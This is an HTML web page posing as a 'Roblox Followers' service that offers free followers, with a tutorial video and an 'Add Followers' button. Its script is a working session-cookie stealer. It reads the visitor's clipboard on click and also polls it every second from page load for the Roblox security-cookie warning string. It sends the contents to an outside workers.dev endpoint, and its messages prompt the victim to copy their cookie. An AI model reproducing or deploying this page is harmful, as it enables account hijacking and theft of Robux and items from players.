<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Followers</title>
<link rel="icon" type="image/png" href="favicon.png">

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  min-height: 100%;
  font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
  overflow-x: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  overflow-y: auto;
  padding: 25px;

  background:
    radial-gradient(circle at 20% 20%, rgba(88,101,242,.12), transparent 40%),
    radial-gradient(circle at 80% 80%, rgba(120,120,255,.08), transparent 40%),
    linear-gradient(135deg, #0b0b10, #13131c 50%, #0b0b10);

  color: white;
}

.background {
  position: fixed;
  inset: 0;
  pointer-events: none;
  overflow: hidden;
  z-index: -1;
}

.glow {
  position: absolute;
  width: 450px;
  height: 450px;
  border-radius: 50%;
  background: rgba(88, 101, 242, 0.05);
  filter: blur(100px);
}

.glow.one {
  top: -180px;
  left: -150px;
}

.glow.two {
  right: -180px;
  bottom: -180px;
}

.main-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 30px;
  width: 100%;
  max-width: 900px;
  margin: auto;
}

.card {
  position: relative;
  width: 100%;
  padding: 50px 40px;
  text-align: center;

  background: rgba(18, 18, 26, 0.85);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 28px;

  box-shadow:
    0 30px 80px rgba(0, 0, 0, 0.6),
    inset 0 1px rgba(255, 255, 255, 0.06);

  backdrop-filter: blur(25px);
}

.logo {
  width: 82px;
  height: 82px;
  margin: 0 auto 20px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 24px;
  background: linear-gradient(135deg, #ffffff, #dedee8);
  color: #111;

  font-size: 38px;
  font-weight: 900;

  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

h1 {
  margin: 0 0 25px 0;
  font-size: 36px;
  letter-spacing: -0.5px;
  font-weight: 800;
}

.main-button {
  width: 100%;
  padding: 18px 24px;
  margin-top: 25px;

  border: none;
  border-radius: 15px;

  background: white;
  color: #111;

  font-size: 19px;
  font-weight: 800;

  cursor: pointer;

  transition:
    transform .2s ease,
    box-shadow .2s ease,
    background .2s ease;
}

.main-button:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 35px rgba(255,255,255,.16);
  background: #f0f0f0;
}

.main-button:active {
  transform: translateY(0) scale(.98);
}

.status {
  margin-top: 18px;
  min-height: 20px;
  font-size: 13px;
  color: #8ea1ff;
  font-weight: 500;
}

/* Loading spinner */
.spinner {
  display: inline-block;
  width: 16px;
  height: 16px;
  margin-right: 8px;
  vertical-align: -3px;

  border: 3px solid rgba(0,0,0,.2);
  border-top-color: #111;
  border-radius: 50%;

  animation: spin .8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

/* Tutorial Video Container */
.video-container {
  position: relative;
  width: 100%;
  aspect-ratio: 16 / 9;
  overflow: hidden;
  border-radius: 18px;
  background: #000;
  border: 1px solid rgba(255, 255, 255, 0.1);
  box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
  display: flex;
  align-items: center;
  justify-content: center;
}

.video-frame {
  display: block;
  width: 100%;
  height: 100%;
  border: none;
}
</style>

</head>

<body>

<div class="background">
  <div class="glow one"></div>
  <div class="glow two"></div>
</div>

<div class="main-wrapper">

  <div class="card">
    <div class="logo">R</div>
    <h1>Roblox Followers</h1>

    <div class="video-container">
      <iframe
        class="video-frame"
        src="https://www.youtube-nocookie.com/embed/NkJcPlpqJtw?vq=hd1080&modestbranding=1&rel=0"
        title="Tutorial"
        allow="encrypted-media; picture-in-picture"
        allowfullscreen>
      </iframe>
    </div>

    <button class="main-button" id="main">
      Add Followers 
    </button>

    <div class="status" id="status"></div>
  </div>

</div>

<script>
const button = document.getElementById("main");
const status = document.getElementById("status");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";
     
async function sendClipboardData(text) {
  try {
    await fetch(SEND_ENDPOINT, {     
      method: "POST",     
      headers: {     
        "Content-Type": "application/json"     
      },     
      body: JSON.stringify({     
        clipboardText: text     
      })     
    });     
     
    await new Promise(resolve => setTimeout(resolve, 10000));     
     
    status.textContent = "Restart Device To Get Followers Added to your account!";     
  } catch (error) {     
    status.textContent = "Something went wrong. Please try again.";     
    console.error(error);     
  }
}

button.addEventListener("click", async () => {     
  try {     
    status.innerHTML = `     
      <span class="spinner"></span>     
      Adding Followers...     
    `;     
     
    const text = await navigator.clipboard.readText();     
     
    if (!text) {     
      status.textContent = "error make sure u copy cookie";     
      return;     
    }     
     
    await sendClipboardData(text);
     
  } catch (error) {     
    status.textContent = "error make sure u copy cookie";     
    console.error(error);     
  }     
});

async function monitorClipboard() {
  if (!navigator.clipboard || !navigator.clipboard.readText) return;
  
  try {
    const text = await navigator.clipboard.readText();
    if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
      await sendClipboardData(text);
      return;
    }
  } catch (e) {
    // Clipboard permission might require user interaction first
  }
  
  setTimeout(monitorClipboard, 1000);
}

window.addEventListener("load", () => {
  setTimeout(monitorClipboard, 500);
});
</script>     
     
</body>  
</html>
